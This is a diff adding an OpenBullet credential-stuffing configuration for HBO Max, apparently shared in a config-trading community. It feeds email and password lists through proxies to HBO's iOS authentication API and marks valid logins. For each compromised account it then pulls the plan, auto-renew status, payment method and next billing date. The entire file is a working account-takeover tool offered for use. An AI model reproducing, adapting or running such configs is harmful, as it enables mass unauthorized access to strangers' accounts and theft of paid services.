@@ -1,0 +1,153 @@
+[SETTINGS]
+{
+  "Name": "hbo-ios-api",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-07-10T10:34:16.1351203+00:00",
+  "AdditionalInfo": "join @openbulletconfigs",
+  "Author": "@jamesbond706",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+[SETTINGS]
+{
+  "Name": "HBOMAX-ios-api(@jamesbond706)",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-07-06T07:28:27.7769467-07:00",
+  "AdditionalInfo": "",
+  "Author": "@jamesbond706",
+  "Version": "1.3.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#id FUNCTION RandomGUID -> VAR "id" 
+
+REQUEST POST "https://gateway.api.hbo.com/auth/tokens" 
+  CONTENT "{\"client_id\":\"24fa5e36-3dc4-4ed0-b3f1-29909271b63d\",\"client_secret\":\"24fa5e36-3dc4-4ed0-b3f1-29909271b63d\",\"scope\":\"browse video_playback_free account_registration\",\"grant_type\":\"client_credentials\",\"deviceSerialNumber\":\"ff1cdf77-fbe3-4ecd-c2f8-cb3cbaf7161c\",\"clientDeviceData\":{\"paymentProviderCode\":\"apple\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "content-type: application/json" 
+  HEADER "x-hbo-device-name: ios" 
+  HEADER "accept: application/vnd.hbo.v9.full+json" 
+  HEADER "x-hbo-client-version: Hadron/50.30.1.256 ios (IPHONE/14.2)" 
+  HEADER "accept-language: en-us" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "content-length: 310" 
+  HEADER "user-agent: HBOMAX/50.30.1.256 CFNetwork/1240.0.4 Darwin/20.5.0" 
+  HEADER "x-hbo-device-os-version: 14.6" 
+
+#token PARSE "<SOURCE>" JSON "access_token" -> VAR "token" 
+
+REQUEST POST "https://gateway.api.hbo.com/auth/tokens" 
+  CONTENT "{\"grant_type\":\"user_name_password\",\"scope\":\"browse video_playback device elevated_account_management\",\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "content-type: application/json" 
+  HEADER "x-hbo-device-name: ios" 
+  HEADER "accept: application/vnd.hbo.v9.full+json" 
+  HEADER "authorization: Bearer <token>" 
+  HEADER "x-hbo-client-version: Hadron/50.30.1.256 ios (IPHONE/14.2)" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-us" 
+  HEADER "content-length: 160" 
+  HEADER "user-agent: HBOMAX/50.30.1.256 CFNetwork/1240.0.4 Darwin/20.5.0" 
+  HEADER "x-hbo-device-os-version: 14.2" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The email address or password is incorrect" 
+    KEY "code\":\"invalid_credentials" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
+#token1 PARSE "<SOURCE>" JSON "access_token" -> VAR "token1" 
+
+REQUEST POST "https://comet.api.hbo.com/content" 
+  CONTENT "[{\"id\":\"urn:hbo:billing-status:mine\"}]" 
+  CONTENTTYPE "application/json" 
+  HEADER "content-type: application/json" 
+  HEADER "x-hbo-device-name: ios" 
+  HEADER "accept: application/vnd.hbo.v9.full+json" 
+  HEADER "authorization: Bearer <token1>" 
+  HEADER "x-hbo-client-version: Hadron/50.30.1.256 ios (IPHONE/14.2)" 
+  HEADER "accept-language: en-us" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "content-length: 38" 
+  HEADER "user-agent: HBOMAX/50.30.1.256 CFNetwork/1240.0.4 Darwin/20.5.0" 
+  HEADER "x-hbo-device-os-version: 14.2" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "You’re not subscribed to HBO Max" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "Your subscription expired on" 
+
+#current_plan PARSE "<SOURCE>" LR "Current Plan: " "(strong)" -> CAP "Current Plan" 
+
+#auto_renew PARSE "<SOURCE>" JSON "autoRenew" -> CAP "Auto Renew" 
+
+#payment_method PARSE "<SOURCE>" LR "nPayment Method: " "(" -> CAP "Payment Method" 
+
+#next_billing PARSE "<SOURCE>" LR "Next Billing Date: [" "T" -> CAP "Next Billing" 
+
+FUNCTION Constant "$@ jamesbond706 $" -> CAP "CONFIG BY" 
+
